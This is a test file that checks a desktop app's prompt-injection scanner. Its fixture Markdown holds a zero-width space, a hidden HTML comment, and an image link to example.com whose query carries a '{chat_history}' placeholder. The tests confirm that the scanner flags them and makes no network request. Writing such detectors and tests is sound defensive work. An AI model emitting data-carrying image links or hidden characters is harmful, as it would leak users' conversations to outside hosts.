import { writeFileSync } from 'node:fs';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { MainWindowPage } from '../../pages/MainWindowPage';
import { PromptInjectionPanelPage } from '../../pages/PromptInjectionPanelPage';
import { DesktopApp } from '../../support/DesktopApp';
import { findAccessibilityViolations } from '../../support/findAccessibilityViolations';
import { TestWorkspace } from '../../support/TestWorkspace';

const APP_HOSTS = new Set(['tauri.localhost', 'ipc.localhost', 'mdx-image.localhost']);
const HIDDEN_CONTENT_DOCUMENT = 'hidden-content.md';

/** Hidden characters are written as escapes, so this file never holds them itself. */
function hiddenContentDocument(): string {
  return [
    '# Hidden content',
    '',
    'A word with a zero\u200Bwidth space inside.',
    '',
    '<!-- a comment that a reader of the page never sees -->',
    '',
    '![status](https://example.com/pixel.png?q={chat_history})',
    '',
  ].join('\n');
}

describe('the prompt injection check', () => {
  let workspace: TestWorkspace;
  let app: DesktopApp;
  let mainWindow: MainWindowPage;
  let panel: PromptInjectionPanelPage;

  beforeEach(async () => {
    workspace = TestWorkspace.create();
    writeFileSync(workspace.documentPath(HIDDEN_CONTENT_DOCUMENT), hiddenContentDocument());
    app = await DesktopApp.launch({ workspace, documentFileNames: [HIDDEN_CONTENT_DOCUMENT] });
    mainWindow = new MainWindowPage(app.browser);
    panel = new PromptInjectionPanelPage(app.browser);
    await mainWindow.waitForDocumentHeading('Hidden content');
  });

  afterEach(async () => {
    await app.quit();
    workspace.remove();
  });

  it('lists the findings of the shown document after the command palette runs the check', async () => {
    await panel.runCheckFromCommandPalette();

    await panel.waitForSummary('highest High');
    expect(await panel.ruleTitles()).toEqual(
      expect.arrayContaining(['Image address that carries data', 'Zero-width characters']),
    );
    expect(await findAccessibilityViolations(app.browser)).toEqual([]);
  });

  it('opens the source view at a finding with its range outlined, and announces the line', async () => {
    await panel.runCheckFromCommandPalette();
    await panel.waitForSummary('highest High');

    await panel.activateFinding('Zero-width characters');

    await mainWindow.waitForRenderedElement('pre.source-view');
    await app.browser.waitUntil(() => panel.isSourceRangeOutlined());
    expect(await panel.outlinedSourceText()).toBe('\u200B');
    expect(await panel.announcement()).toBe('Line 3');
  });

  it('makes no network request while it checks a document with remote addresses', async () => {
    await panel.runCheckFromCommandPalette();
    await panel.waitForSummary('highest High');

    const loadedUrls = await app.browser.execute(() =>
      performance.getEntriesByType('resource').map((entry) => entry.name),
    );

    expect(loadedUrls.filter((url) => !APP_HOSTS.has(new URL(url).hostname))).toEqual([]);
  });
});
